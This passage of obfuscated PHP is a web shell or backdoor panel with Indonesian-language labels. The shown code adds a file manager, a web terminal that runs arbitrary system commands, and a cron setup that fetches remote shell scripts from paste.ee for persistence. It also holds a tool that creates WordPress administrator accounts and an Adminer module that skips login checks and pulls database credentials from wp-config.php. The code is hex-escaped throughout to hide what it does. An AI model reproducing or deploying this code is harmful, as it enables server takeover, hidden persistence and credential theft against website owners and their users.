$item["\x6d\157\x64\x69\x66\151\x65\x64"] . "\47\51\42\76" . $item["\155\157\x64\x69\146\x69\x65\x64"] . "\x3c\57\x61\76\74\x2f\x74\x64\x3e"; echo "\x3c\x74\144\x20\143\x6c\x61\x73\163\x3d\x22\x61\x63\x74\x69\157\156\163\x2d\143\x6f\154\42\x3e"; if ($item["\x74\x79\160\145"] === "\x66\151\x6c\145") { echo "\74\141\40\150\x72\145\146\75\x22\x3f\x6d\x65\x6e\x75\75\x65\170\160\154\157\x72\x65\x72\46\x70\141\164\150\x3d" . urlencode($current_path) . "\x26\x66\151\154\x65\x5f\141\x63\164\x69\157\156\75\x65\144\151\164\x26\164\x61\x72\x67\145\x74\x3d" . urlencode($item["\x72\x61\x77\x5f\x6e\x61\155\x65"]) . "\42\40\x63\x6c\141\163\163\75\x22\x61\x63\x74\x69\157\156\55\142\164\156\x22\x20\x74\151\x74\x6c\145\x3d\42\x45\x64\x69\164\42\76\74\151\40\143\154\x61\163\163\x3d\x22\x66\141\163\40\x66\x61\55\x65\144\x69\x74\42\x3e\74\57\151\76\x3c\x2f\x61\76\x20"; } echo "\74\141\40\x68\162\145\x66\75\x22\43\x22\x20\x6f\156\143\x6c\151\x63\x6b\75\x22\x72\145\156\x61\x6d\x65\111\x74\x65\155\50\47" . urlencode($current_path) . "\x27\x2c\x20\x27" . urlencode($item["\162\x61\167\x5f\156\x61\155\x65"]) . "\x27\x2c\x20\47" . addslashes($item["\x6e\141\155\x65"]) . "\x27\51\x22\x20\x63\154\x61\x73\163\x3d\x22\x61\x63\x74\x69\157\156\x2d\142\x74\156\x22\40\164\151\x74\154\145\75\x22\x52\x65\x6e\141\x6d\145\42\x3e\x3c\x69\40\143\x6c\x61\x73\x73\75\x22\146\141\x73\x20\x66\x61\55\160\145\156\143\151\154\x2d\x61\154\x74\x22\x3e\74\57\x69\x3e\x3c\57\x61\x3e\40\74\141\40\x68\162\145\146\75\42\x3f\155\145\156\x75\x3d\145\x78\x70\x6c\157\x72\145\x72\x26\x70\141\x74\x68\75" . urlencode($current_path) . "\46\x66\151\x6c\x65\x5f\x61\143\x74\x69\x6f\x6e\x3d\144\x65\x6c\145\x74\x65\x26\164\141\162\147\145\164\x3d" . urlencode($item["\162\141\167\x5f\156\x61\x6d\x65"]) . "\x22\40\x6f\x6e\x63\x6c\x69\x63\153\75\x22\162\x65\164\x75\x72\156\x20\x63\x6f\156\146\151\x72\155\104\x65\x6c\x65\x74\145\x28\x27" . addslashes($item["\x6e\x61\x6d\x65"]) . "\x27\x29\42\40\143\x6c\x61\163\163\x3d\42\x61\x63\x74\151\x6f\156\x2d\142\x74\x6e\42\40\x74\151\164\154\x65\x3d\42\104\145\x6c\x65\164\145\x22\76\74\151\x20\x63\x6c\141\163\163\x3d\42\x66\x61\x73\x20\146\x61\55\164\x72\x61\163\x68\42\x3e\74\x2f\x69\76\74\57\141\76\40"; if ($item["\x74\x79\x70\x65"] === "\146\x69\x6c\x65") { echo "\x3c\x61\40\x68\162\145\146\x3d\42\77\x6d\x65\156\165\75\145\170\160\x6c\157\162\145\x72\x26\x70\x61\x74\150\x3d" . urlencode($current_path) . "\x26\x66\151\x6c\145\137\x61\143\164\x69\x6f\x6e\75\144\157\167\156\154\157\x61\144\46\164\141\162\147\x65\x74\75" . urlencode($item["\162\141\x77\x5f\x6e\x61\x6d\145"]) . "\42\40\143\154\x61\163\x73\x3d\x22\141\x63\x74\x69\157\156\55\142\x74\x6e\x22\40\x74\x69\164\x6c\x65\75\42\104\x6f\167\156\154\157\141\144\42\76\74\151\x20\143\154\141\x73\163\75\x22\146\x61\163\40\146\141\x2d\144\157\167\156\x6c\x6f\x61\x64\x22\x3e\74\57\151\x3e\74\57\x61\76\x20"; if (strtolower(pathinfo($item["\156\141\155\145"], PATHINFO_EXTENSION)) === "\172\x69\160") { echo "\74\141\x20\x68\x72\145\146\x3d\x22\x3f\155\x65\156\x75\75\x65\170\160\x6c\157\x72\145\x72\46\160\x61\164\x68\75" . urlencode($current_path) . "\46\146\151\154\145\x5f\x61\143\x74\151\157\156\x3d\x75\x6e\x7a\151\160\x26\x74\141\162\x67\x65\x74\x3d" . urlencode($item["\x72\x61\x77\137\156\x61\155\145"]) . "\42\x20\x63\154\x61\163\163\75\42\x61\143\164\151\x6f\156\x2d\x62\x74\x6e\x22\40\x74\x69\x74\x6c\145\x3d\x22\x55\x6e\x7a\151\160\42\x3e\74\x69\40\x63\154\x61\x73\163\75\x22\x66\141\x73\40\146\x61\55\146\151\x6c\x65\x2d\141\x72\x63\150\151\166\145\42\x3e\x3c\x2f\x69\x3e\74\57\141\x3e\40"; } echo "\x3c\x61\x20\150\162\145\146\75\42\x3f\x6d\x65\x6e\x75\75\x65\170\x70\154\157\x72\x65\162\x26\x70\141\164\150\x3d" . urlencode($current_path) . "\46\146\151\x6c\145\137\141\143\164\151\x6f\x6e\x3d\x6c\157\x63\153\x26\x74\x61\x72\x67\145\164\x3d" . urlencode($item["\x72\x61\167\x5f\156\141\x6d\x65"]) . "\x22\x20\x6f\x6e\x63\x6c\151\x63\153\x3d\42\x72\145\164\x75\x72\x6e\40\x63\157\x6e\x66\x69\162\x6d\50\x27\x59\x61\153\x69\156\x20\153\165\156\x63\151\40\146\151\x6c\x65\x20\x5c\x27" . addslashes($item["\156\141\155\145"]) . "\x5c\x27\77\x27\51\x22\40\143\154\141\163\x73\75\x22\141\143\164\x69\x6f\x6e\x2d\142\x74\156\42\40\164\x69\x74\154\145\75\42\114\157\x63\153\x22\x3e\x3c\x69\40\x63\x6c\141\x73\163\75\42\x66\141\163\40\146\x61\55\x6c\157\x63\153\x22\76\x3c\57\151\x3e\x3c\57\141\x3e"; } echo "\74\57\164\144\76\x3c\57\x74\x72\x3e"; } ?>
                                </tbody></table>
                                <div class="p-3 bg-gray-900/50 flex items-center gap-4"><span>Dengan yang dipilih:</span><select name="bulk_operation" class="bg-gray-800"><option value="">--Pilih Aksi--</option><option value="delete">Hapus</option><option value="zip">Zip</option></select><input type="text" name="zip_filename" placeholder="archive.zip" class="bg-gray-800"><button type="submit" class="cyber-btn cyber-btn-primary">Terapkan</button></div>
                                </form></section> <?php  } } elseif ($active_menu === "\x74\145\162\x6d\151\x6e\x61\154") { if (isset($current_path)) { $_SESSION["\143\167\x64"] = $current_path; } if (!isset($_SESSION["\x63\x77\x64"])) { $_SESSION["\143\x77\x64"] = call_user_func($getcwd_fn); } if (!isset($_SESSION["\x68\x69\163\x74\x6f\x72\x79"])) { $_SESSION["\x68\x69\x73\164\157\162\171"] = array(array("\x63\x6d\x64" => "\114\157\x67\151\156\x20\102\145\x72\150\141\x73\151\154", "\157\x75\164" => "\x4b\x65\164\151\x6b\x20\x60\150\145\x6c\160\140\x20\x75\x6e\x74\x75\x6b\40\142\141\156\x74\x75\x61\156\x2e", "\x63\167\144" => $_SESSION["\x63\x77\144"])); } function terminal_execute_command($command, $cwd) { if (!function_exists("\160\162\157\x63\x5f\157\x70\145\156")) { return "\x45\122\x52\x4f\x52\40\x4b\105\x41\x4d\101\116\101\116\72\40\x46\165\x6e\147\x73\x69\40\140\160\x72\x6f\x63\x5f\157\160\x65\x6e\140\x20\x64\151\156\157\x6e\x61\153\164\x69\x66\153\x61\156\56"; } $descriptorspec = array(0 => array("\x70\x69\x70\x65", "\x72"), 1 => array("\160\x69\x70\x65", "\167"), 2 => array("\160\x69\x70\145", "\167")); $env = array_merge($_SERVER, $_ENV); $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env); $output = ''; $error = ''; if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); fclose($pipes[1]); $error = stream_get_contents($pipes[2]); fclose($pipes[2]); proc_close($process); } else { $error = "\107\x61\x67\x61\x6c\x20\155\145\x6e\147\x65\x6b\163\x65\153\165\x73\x69\40\x70\145\162\x69\x6e\164\141\150\56"; } return trim($error . "\xa" . $output); } function terminal_get_prompt($cwd) { static $user = null; static $host = null; if ($user === null) { $user_cmd = function_exists("\x70\x6f\163\x69\x78\x5f\147\x65\164\x70\167\x75\x69\144") && function_exists("\x70\x6f\x73\151\170\x5f\147\145\164\x65\165\151\x64") ? posix_getpwuid(posix_geteuid())["\x6e\x61\x6d\145"] : terminal_execute_command("\167\150\157\x61\155\x69", getcwd()); $user = trim($user_cmd); } if ($host === null) { $host = gethostname(); if ($host === false) { $host = "\154\157\143\141\x6c\x68\x6f\163\164"; } } $home = getenv("\x48\117\115\105"); if (!empty($home) && strpos($cwd, $home) === 0) { $cwd_display = "\176" . substr($cwd, strlen($home)); } else { $cwd_display = $cwd; } return htmlspecialchars($user . "\x40" . $host . "\x3a" . $cwd_display . "\44"); } $terminal_output = ''; $command = ''; $terminal_current_cwd = $_SESSION["\x63\167\144"]; if (isset($_POST["\x63\141\156\x63\x65\x6c\137\145\144\151\x74"])) { unset($_SESSION["\x65\144\x69\x74\x5f\x66\151\154\145"]); } elseif (isset($_POST["\163\x61\x76\145\x5f\x66\x69\x6c\x65"], $_SESSION["\x65\x64\x69\164\137\146\x69\154\x65"])) { $file_path = $_SESSION["\145\144\151\164\x5f\146\151\x6c\145"]; $content = $_POST["\x66\x69\x6c\145\x5f\x63\x6f\x6e\x74\145\x6e\x74"] ?? ''; if (is_writable(dirname($file_path))) { if (file_put_contents($file_path, $content) !== false) { $_SESSION["\150\x69\163\x74\x6f\162\171"][] = array("\143\x6d\144" => "\x73\141\x76\x65\40" . basename($file_path), "\x6f\165\x74" => "\106\151\154\145\40" . basename($file_path) . "\40\142\145\162\150\141\163\151\x6c\x20\144\151\163\x69\x6d\x70\x61\156\56", "\143\167\x64" => $terminal_current_cwd); } else { $_SESSION["\150\x69\163\164\x6f\162\171"][] = array("\x63\155\x64" => "\163\141\x76\145\40" . basename($file_path), "\157\165\x74" => "\107\x41\107\x41\114\x20\155\145\x6e\171\x69\155\160\x61\x6e\40\x66\151\x6c\x65\56", "\143\x77\144" => $terminal_current_cwd); } } else { $_SESSION["\150\x69\163\164\x6f\162\171"][] = array("\143\x6d\144" => "\163\x61\166\x65\x20" . basename($file_path), "\x6f\x75\x74" => "\107\x41\x47\x41\114\40\x6d\x65\x6e\171\x69\x6d\x70\x61\156\40\146\x69\x6c\145\56\40\x44\x69\162\145\x6b\164\157\162\x69\40\x74\x69\x64\141\x6b\x20\144\x61\x70\141\x74\x20\x64\x69\164\x75\154\x69\163\x2e", "\143\167\x64" => $terminal_current_cwd); } unset($_SESSION["\x65\144\151\164\137\x66\151\x6c\x65"]); } elseif (isset($_POST["\143\155\x64"]) && !isset($_SESSION["\145\144\x69\x74\137\146\151\154\x65"])) { $command = trim($_POST["\x63\155\144"]); if (empty($command) && isset($_POST["\143\x6d\144"])) { $_SESSION["\x68\x69\163\164\x6f\x72\x79"][] = array("\x63\x6d\144" => '', "\157\x75\164" => '', "\x63\x77\x64" => $terminal_current_cwd); } else { if (strtolower($command) === "\154\x6f\x67\x6f\165\x74") { $_SESSION["\x68\x69\163\x74\157\162\171"][] = array("\x63\x6d\144" => "\x6c\157\x67\157\165\x74", "\x6f\165\x74" => "\x4c\157\x67\x67\x69\x6e\x67\40\x6f\165\x74\56\56\56", "\x63\167\x64" => $terminal_current_cwd); echo "\x3c\163\143\162\151\160\x74\x3e\167\x69\156\x64\157\x77\56\154\157\x63\141\164\x69\x6f\156\x2e\x68\162\x65\x66\x3d\42\x3f\154\x6f\x67\x6f\x75\x74\75\x31\x22\x3b\74\57\163\x63\162\x69\x70\164\76"; die; } else { $parts = explode("\40", $command, 2); $cmd_base = strtolower($parts[0]); $cmd_arg = $parts[1] ?? ''; switch ($cmd_base) { case "\143\x6c\145\141\162": $_SESSION["\x68\151\x73\164\157\x72\171"] = array(); break; case "\x63\x64": $target_dir = empty($cmd_arg) ? getenv("\x48\x4f\x4d\x45") ?: $terminal_current_cwd : $cmd_arg; $new_path = substr($target_dir, 0, 1) === DIRECTORY_SEPARATOR || DIRECTORY_SEPARATOR === "\x5c" && preg_match("\x2f\136\x5b\141\x2d\x7a\101\x2d\132\135\x3a\134\x5c\57", $target_dir) ? $target_dir : $terminal_current_cwd . DIRECTORY_SEPARATOR . $target_dir; $resolved_path = realpath($new_path); if ($resolved_path !== false && is_dir($resolved_path) && is_readable($resolved_path)) { $_SESSION["\143\x77\144"] = $resolved_path; $_SESSION["\143\x75\162\162\x65\156\x74\137\145\x78\160\154\x6f\162\x65\x72\137\160\141\x74\150"] = $resolved_path; $terminal_output = ''; } else { $terminal_output = "\x63\144\72\40\105\162\x72\x6f\162\72\x20\x44\x69\162\145\153\164\157\162\151\40\x74\151\x64\x61\153\40\144\x69\x74\x65\155\x75\153\141\156\x2e"; } $_SESSION["\150\151\163\164\x6f\x72\171"][] = array("\x63\155\x64" => $command, "\x6f\x75\x74" => $terminal_output, "\x63\167\144" => $_SESSION["\143\x77\144"]); break; case "\145\x64\151\164": if (!empty($cmd_arg)) { $file_path = $terminal_current_cwd . DIRECTORY_SEPARATOR . $cmd_arg; if (file_exists($file_path) && is_readable($file_path) && is_file($file_path) || !file_exists($file_path) && is_writable($terminal_current_cwd)) { $_SESSION["\x65\x64\151\x74\x5f\146\x69\154\145"] = $file_path; } else { $terminal_output = "\x65\144\151\x74\72\x20\x45\x72\162\x6f\162\x3a\40\x46\151\154\145\x20\164\151\144\x61\x6b\40\x64\x61\160\141\x74\40\x64\x69\141\153\x73\x65\x73\56"; $_SESSION["\x68\x69\163\x74\x6f\162\x79"][] = array("\143\x6d\x64" => $command, "\157\165\164" => $terminal_output, "\x63\167\x64" => $terminal_current_cwd); } } else { $terminal_output = "\x65\x64\x69\x74\72\40\107\x75\x6e\x61\x6b\x61\x6e\x3a\x20\x65\144\151\164\40\74\156\x61\x6d\x61\146\x69\x6c\x65\76"; $_SESSION["\150\151\163\164\x6f\162\171"][] = array("\143\155\x64" => $command, "\x6f\x75\x74" => $terminal_output, "\x63\x77\144" => $terminal_current_cwd); } break; case "\x68\145\x6c\160": $terminal_output = "\x50\145\162\151\x6e\x74\141\x68\40\x42\x61\x77\x61\x61\x6e\x3a\xa\x20\x20\143\144\40\74\x64\x69\162\76\12\40\x20\x65\x64\151\x74\40\74\x66\x69\154\145\x3e\12\x20\40\143\154\145\141\x72\xa\x20\40\154\157\x67\x6f\165\x74\12\x20\x20\x68\x65\154\x70"; $_SESSION["\150\151\x73\164\157\x72\171"][] = array("\x63\x6d\x64" => $command, "\157\x75\164" => $terminal_output, "\143\x77\x64" => $terminal_current_cwd); break; default: $terminal_output = terminal_execute_command($command, $terminal_current_cwd); $_SESSION["\x68\x69\163\x74\x6f\162\x79"][] = array("\x63\x6d\x64" => $command, "\x6f\x75\x74" => $terminal_output, "\x63\167\x64" => $terminal_current_cwd); } } } } ?>
                        <section class="cyber-panel p-4">
                            <div class="terminal-body">
                                <h1 class="terminal-h1 cyber-font cyber-glow p-2">Web Terminal</h1> 
                                <?php  if (isset($_SESSION["\145\x64\151\164\x5f\146\x69\154\145"])) { $is_new = !is_file($_SESSION["\x65\x64\x69\x74\x5f\146\151\154\x65"]); ?>
<div class="p-2">Mengedit: <code><?php  echo htmlspecialchars($_SESSION["\145\x64\x69\x74\137\x66\x69\x6c\x65"]); ?>
</code> (<?php  echo $is_new ? "\106\151\154\145\x20\x42\x61\162\x75" : "\x46\151\x6c\145\x20\114\x61\x6d\141"; ?>
)</div><form method="POST" action="?menu=terminal&path=<?php  echo urlencode($current_path); ?>
"><textarea id="code-editor" name="file_content"><?php  echo $is_new ? '' : htmlspecialchars(file_get_contents($_SESSION["\145\x64\x69\x74\x5f\146\x69\x6c\145"])); ?>
</textarea><div class="p-2"><button type="submit" name="save_file" value="1" class="cyber-btn cyber-btn-primary">Simpan</button><button type="submit" name="cancel_edit" value="1" class="cyber-btn">Batal</button></div></form> <?php  } else { ?>
<div class="terminal-display" id="terminalBox"><?php  $max_history = 200; if (count($_SESSION["\150\151\x73\164\x6f\162\171"]) > $max_history) { $_SESSION["\150\151\x73\164\x6f\x72\x79"] = array_slice($_SESSION["\x68\151\163\x74\157\162\x79"], -$max_history); } foreach ($_SESSION["\150\151\163\x74\x6f\162\171"] as $item) { ?>
<div class="history-item"><div class="prompt-line"><span class="prompt"><?php  echo terminal_get_prompt($item["\x63\167\144"]); ?>
</span><span class="command"><?php  echo htmlspecialchars($item["\x63\x6d\144"]); ?>
</span></div><?php  if (isset($item["\157\165\x74"]) && $item["\x6f\x75\164"] !== '') { ?>
<pre class="output"><?php  echo htmlspecialchars($item["\157\x75\164"]); ?>
</pre><?php  } ?>
</div><?php  } ?>
</div><form method="POST" action="?menu=terminal&path=<?php  echo urlencode($current_path); ?>
" class="p-2"><div class="flex"><label for="cmd_input" class="prompt mr-2"><?php  echo terminal_get_prompt($terminal_current_cwd); ?>
</label><input type="text" id="cmd_input" name="cmd" autofocus autocomplete="off" spellcheck="false" class="flex-grow bg-transparent border-0 focus:ring-0 p-0"><input type="submit" style="display:none;"></div></form><?php  } ?>
                            </div>
                        </section>
                    <?php  } elseif ($active_menu === "\x63\162\x6f\x6e") { ?>
 
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">CRON JOB SETUP</h1>
                            <form method="post" action="<?php  echo $htmlspecialchars_fn($_SERVER["\120\x48\120\137\123\105\x4c\106"]); ?>
?menu=cron&path=<?php  echo urlencode($auto_path_script); ?>
">
                                <input type="hidden" name="action" value="setup_cron">
                                <div class="mb-4"><label for="path_cron_display">Path Target Cron (Auto):</label><input type="text" id="path_cron_display" value="<?php  echo $htmlspecialchars_fn($auto_path_script); ?>
" readonly></div>
                                <div class="mb-4"><label for="shell_filename_cron">Nama File Shell Cron:</label><input type="text" id="shell_filename_cron" name="shell_filename_cron" placeholder="index.php" value="<?php  echo $htmlspecialchars_fn(isset($_POST["\163\150\x65\154\154\x5f\146\x69\154\145\156\x61\155\x65\x5f\x63\162\157\156"]) ? $_POST["\163\x68\145\154\x6c\x5f\146\x69\154\145\x6e\141\155\145\x5f\x63\162\x6f\x6e"] : "\x69\x6e\x64\x65\x78\x2e\160\150\x70"); ?>
"></div>
                                <div class="mb-4"><label>Pilih Jenis Shell (URL Auto-Fill):</label><div class="flex flex-wrap gap-2 mt-2"><?php  $shells = array("\x41\114\106\101" => "\150\164\x74\160\x73\x3a\x2f\x2f\160\141\x73\x74\x65\56\145\x65\x2f\x72\57\157\165\151\x6f\164\155\x4d\x62", "\x47\x65\x63\x6b\x6f" => "\x68\164\x74\160\x73\x3a\x2f\x2f\x70\141\163\x74\x65\56\145\145\x2f\x72\57\x48\x44\151\154\166\x36\x4e\x64", "\115\x61\x6c\x69\156\x67\40\127\120" => "\x68\164\164\160\x73\x3a\57\x2f\160\x61\x73\x74\x65\x2e\145\145\57\162\57\x53\113\146\160\x41\71\x53\132"); foreach ($shells as $name => $url) { echo "\74\142\x75\x74\x74\x6f\x6e\40\164\171\160\x65\x3d\42\x62\x75\x74\x74\x6f\x6e\x22\x20\143\154\x61\x73\x73\75\x22\x63\171\142\145\x72\x2d\x62\x74\x6e\x20\x63\171\x62\145\162\x2d\142\164\x6e\55\160\x72\x69\x6d\x61\x72\171\x22\x20\157\156\143\x6c\151\143\x6b\75\42\x73\145\x74\123\x68\145\154\x6c\125\x72\x6c\x46\x6f\162\103\x72\157\x6e\50\47{$url}\47\51\x22\76{$name}\74\57\x62\165\x74\164\x6f\x6e\x3e"; } ?>
</div></div>
                                <div class="mb-4"><label for="url_cron_input">URL Raw Shell Cron:</label><input type="url" id="url_cron_input" name="url_cron" placeholder="Pilih dari atas atau input manual" value="<?php  echo $htmlspecialchars_fn(isset($_POST["\x75\162\154\137\x63\x72\x6f\156"]) ? $_POST["\x75\162\154\x5f\143\x72\x6f\x6e"] : ''); ?>
"></div>
                                <button type="submit" class="cyber-btn cyber-btn-primary w-full">EXECUTE CRON SETUP</button>
                            </form>
                        </section> 
                    <?php  } elseif ($active_menu === "\166\x69\145\x77\137\x63\162\157\156\x74\141\142") { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">Encoded Crontab</h1>
                            <p class="mb-4">Berikut adalah isi dari `crontab -l` yang di-encode dengan Base64.</p>
                            <pre class="bg-black p-4 max-h-96 overflow-y-auto"><?php  echo $base64_encode_fn(try_execute_command("\x63\162\x6f\x6e\x74\x61\142\x20\55\154")); ?>
</pre>
                        </section>
                    <?php  } elseif ($active_menu === "\x77\x70\137\x61\144\x6d\151\156\137\x63\162\145\141\x74\157\x72") { ?>
 
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">WP ADMIN CREATOR</h1>
                            <?php  $wp_load_path_display_html_page_creator_final_full_html = find_wp_load_path($auto_path_script); $can_show_wp_form_html_page_creator_final_full_html = false; $file_exists_wp_check_html_page_creator_final_full_html = _get_fn_name_global_init_v3("\137\x67\137\x61\163\143\151\151\137\146\x69\x6c\145\x5f\x65\170\151\163\164\163", "\146\x69\x6c\x65\x5f\x65\x78\151\x73\x74\x73"); if ($wp_load_path_display_html_page_creator_final_full_html && !empty($file_exists_wp_check_html_page_creator_final_full_html) && call_user_func($file_exists_wp_check_html_page_creator_final_full_html, $wp_load_path_display_html_page_creator_final_full_html)) { if (!defined("\x57\120\x5f\125\x53\105\137\124\x48\105\x4d\105\x53")) { define("\127\x50\137\125\x53\105\137\x54\110\105\115\105\x53", false); } ob_start(); $wp_loaded_check_html_page_creator_final_full_html = @(include_once $wp_load_path_display_html_page_creator_final_full_html); ob_end_clean(); if ($wp_loaded_check_html_page_creator_final_full_html && function_exists("\167\160\137\x6e\x6f\x6e\143\145\137\x66\x69\x65\x6c\x64")) { $can_show_wp_form_html_page_creator_final_full_html = true; } elseif (empty($wp_admin_feedback_text)) { if (!$wp_loaded_check_html_page_creator_final_full_html) { $wp_admin_feedback_text = "\105\x52\122\x4f\x52\x3a\40\107\x61\x67\x61\154\x20\x6d\165\141\x74\40\x57\120\40\x64\141\x72\151\72\40\74\x63\x6f\x64\145\x3e" . $htmlspecialchars_fn($wp_load_path_display_html_page_creator_final_full_html) . "\74\57\143\157\x64\x65\x3e\x2e"; $wp_admin_feedback_class = "\x65\162\162\157\x72"; } elseif (!function_exists("\x77\160\137\156\157\x6e\143\x65\137\146\151\x65\154\x64")) { $wp_admin_feedback_text = "\105\x52\122\x4f\x52\x3a\x20\x46\165\x6e\147\x73\x69\40\127\x6f\x72\144\x50\162\x65\163\163\x20\x74\151\x64\x61\153\x20\x64\x69\x74\x65\155\165\x6b\x61\x6e\x2e"; $wp_admin_feedback_class = "\145\162\162\157\162"; } } } elseif (empty($wp_admin_feedback_text)) { $wp_admin_feedback_text = "\x4b\x52\x49\x54\111\x53\x3a\40\x46\x69\x6c\x65\40\x3c\x63\x6f\144\145\x3e\167\160\55\154\157\x61\x64\x2e\160\x68\160\74\x2f\143\x6f\144\145\x3e\x20\164\151\x64\x61\153\40\144\151\x74\x65\155\165\x6b\141\x6e\56"; $wp_admin_feedback_class = "\145\162\162\157\162"; } if (!empty($wp_admin_feedback_text)) { ?>
<div class="message <?php  echo $htmlspecialchars_fn($wp_admin_feedback_class); ?>
"> <p><?php  echo $wp_admin_feedback_text; ?>
</p> </div> <?php  } if ($can_show_wp_form_html_page_creator_final_full_html) { ?>
<form method="POST" action="?menu=wp_admin_creator&path=<?php  echo urlencode($current_path); ?>
"><input type="hidden" name="action" value="create_wp_admin"><?php  if (function_exists("\x77\x70\x5f\156\157\x6e\x63\x65\x5f\x66\151\145\154\x64")) { wp_nonce_field("\143\x72\145\x61\x74\145\137\141\x64\155\151\x6e\137\x61\x63\164\151\x6f\156", "\x63\162\x65\141\164\145\x5f\x61\x64\x6d\151\156\x5f\x6e\x6f\156\143\145"); } ?>
<div class="mb-4"><label for="username_input_wp">Username:</label><input type="text" id="username_input_wp" name="username" required value="<?php  echo isset($_POST["\x75\163\145\x72\156\x61\155\x65"]) ? $htmlspecialchars_fn($_POST["\x75\163\145\162\x6e\x61\x6d\145"]) : ''; ?>
"></div><div class="mb-4"><label for="password_input_wp">Password (min. 8 karakter):</label><input type="password" id="password_input_wp" name="password" required></div><div class="mb-4"><label for="email_input_wp">Email (opsional):</label><input type="email" id="email_input_wp" name="email" placeholder="admin@example.com" value="<?php  echo isset($_POST["\x65\155\141\x69\x6c"]) ? $htmlspecialchars_fn($_POST["\x65\x6d\141\151\154"]) : ''; ?>
"></div><button type="submit" class="cyber-btn cyber-btn-primary w-full">Buat Admin WordPress</button></form><?php  } elseif (empty($wp_admin_feedback_text)) { ?>
 <p class="message error">Form WP Admin tidak bisa ditampilkan.</p> <?php  } ?>
                        </section>
                    <?php  } elseif ($active_menu === "\167\145\x62\163\x68\x65\154\x6c\x5f\x73\x63\x61\156\x6e\x65\162") { ?>
                        <section class="cyber-panel p-4">
                            <h1 class="cyber-font cyber-glow text-xl mb-4">WEBSHELL SCANNER</h1>
                            <form method="post" action="?menu=webshell_scanner&path=<?php  echo urlencode($current_path); ?>
">
                                <input type="hidden" name="action" value="scan_webshells">
                                <div class="mb-4"><label for="scan_dir_input">Direktori untuk Dipindai:</label><input type="text" id="scan_dir_input" name="scan_dir" value="<?php  echo $htmlspecialchars_fn(isset($_POST["\163\143\x61\x6e\x5f\x64\151\x72"]) ? $_POST["\163\143\141\x6e\x5f\144\151\162"] : call_user_func($getcwd_fn)); ?>
"></div>
                                <button type="submit" name="submit_scan" class="cyber-btn cyber-btn-primary w-full">MULAI PINDAI</button>
                            </form>
                            <?php  if (!empty($scanner_results_html)) { ?>
<div class="mt-6"><h2>Hasil Pemindaian:</h2><div class="file-explorer mt-2"><?php  echo $scanner_results_html; ?>
</div></div><?php  } ?>
                        </section>
                    <?php  } elseif ($active_menu === "\x67\x65\x6e\145\x72\x61\164\157\162") { display_generator_content(); } elseif ($active_menu === "\141\144\155\151\156\x65\x72") { @ob_end_clean(); function adminer_object() { class AdminerSoftware extends Adminer { function login($login, $password) { return true; } function credentials() { $config_path = find_wp_load_path(__DIR__); if ($config_path && is_file($config_path)) { $wp_config_file_path = dirname($config_path) . "\57\167\160\x2d\x63\157\x6e\x66\x69\x67\x2e\160\x68\x70"; if (is_file($wp_config_file_path) && is_readable($wp_config_file_path)) { $config_content = @file_get_contents($wp_config_file_path); if ($config_content) { $db_name = $db_user = $db_password = $db_host = ''; preg_match("\57\x64\x65\146\151\156\x65\x5c\50\134\x73\x2a\x27\x28\x44\102\x5f\x4e\101\115\x45\174\104\102\137\116\101\x4d\105\x5f\x57\120\51\47\54\x5c\163\x2a\47\50\133\x5e\47\135\53\51\47\x5c\163\x2a\x5c\x29\x3b\x2f\x69", $config_content, $m_name); preg_match("\x2f\x64\145\146\x69\x6e\x65\x5c\x28\134\163\x2a\47\50\104\x42\x5f\125\123\105\122\174\104\x42\137\x55\123\x45\122\137\x57\120\x29\47\x2c\x5c\163\x2a\x27\x28\x5b\136\x27\135\53\51\47\x5c\x73\x2a\x5c\51\x3b\57\x69", $config_content, $m_user); preg_match("\x2f\144\145\146\x69\x6e\x65\x5c\50\134\x73\x2a\x27\x28\104\102\137\120\101\x53\123\x57\x4f\x52\104\x7c\104\x42\137\120\x41\x53\123\127\117\122\x44\137\x57\x50\x29\47\54\134\x73\52\x27\x28\x5b\x5e\47\x5d\53\x29\47\x5c\x73\52\x5c\x29\x3b\57\x69", $config_content, $m_pass); preg_match("\x2f\x64\145\146\151\156\x65\134\50\x5c\x73\52\x27\50\104\x42\x5f\110\117\123\x54\174\x44\102\x5f\110\x4f\123\x54\x5f\x57\120\x29\47\x2c\134\163\x2a\x27\x28\133\136\x27\135\53\51\x27\134\x73\52\x5c\x29\x3b\57\x69", $config_content, $m_host); if (!empty($m_user[2]) && isset($m_pass[2])) { echo "\74\163\143\162\x69\160\x74\x3e\144\157\143\165\155\145\x6e\x74\x2e\x61\144\x64\105\x76\x65\156\164\x4c\151\x73\164\x65\x6e\145\x72\x28\x27\x44\x4f\115\103\157\x6e\164\x65\x6e\x74\114\x6f\x61\x64\145\x64\x27\54\40\146\x75\x6e\x63\164\151\157\x6e\50\51\x20\x7b\40\x69\x66\x20\50\x64\157\x63\x75\155\145\156\x74\x2e\x67\145\x74\105\x6c\145\x6d\x65\x6e\164\163\102\171\x4e\141\x6d\x65\x28\x27\x61\165\x74\150\133\144\162\x69\166\x65\x72\135\47\x29\133\60\135\x29\40\x64\x6f\143\165\x6d\x65\156\x74\56\147\145\164\105\x6c\145\x6d\x65\x6e\164\163\x42\x79\116\x61\x6d\145\x28\x27\x61\x75\x74\x68\x5b\144\x72\151\x76\145\162\x5d\x27\51\133\60\135\x2e\x76\x61\154\x75\145\40\75\40\x27\163\145\x72\166\145\x72\47\x3b\x20\151\146\40\50\x64\x6f\x63\x75\155\x65\156\x74\x2e\x67\145\x74\105\x6c\x65\155\x65\x6e\x74\x73\102\x79\x4e\x61\155\145\x28\x27\141\165\x74\150\133\x73\x65\x72\166\x65\162\x5d\x27\51\133\60\135\51\40\144\157\143\165\155\x65\156\x74\56\147\145\164\x45\x6c\x65\x6d\145\x6e\164\163\102\171\116\141\155\x65\50\47\141\165\164\x68\133\163\145\162\x76\145\162\x5d\47\x29\133\x30\135\x2e\x76\x61\154\165\145\x20\x3d\x20\x27" . addslashes($m_host[2] ?? "\x6c\157\143\141\154\150\x6f\x73\164") . 